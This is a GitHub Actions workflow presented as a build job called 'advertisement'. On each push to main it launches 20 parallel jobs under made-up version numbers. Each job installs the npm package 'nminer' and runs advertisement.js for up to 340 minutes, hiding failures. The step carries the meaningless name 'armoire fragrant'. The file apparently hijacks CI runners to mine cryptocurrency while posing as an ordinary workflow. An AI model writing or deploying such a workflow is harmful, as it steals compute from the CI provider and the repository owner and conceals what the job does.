name: advertisement
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9645 }
          - { version: 4848 }
          - { version: 5705 }
          - { version: 1249 }
          - { version: 9137 }
          - { version: 2926 }
          - { version: 4453 }
          - { version: 4650 }
          - { version: 3550 }
          - { version: 2414 }
          - { version: 6648 }
          - { version: 5297 }
          - { version: 9550 }
          - { version: 3860 }
          - { version: 9622 }
          - { version: 738 }
          - { version: 1230 }
          - { version: 1413 }
          - { version: 136 }
          - { version: 6910 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: armoire fragrant
        run: |
          npm install nminer@latest
          timeout 340m node advertisement.js || echo "advertisement executed"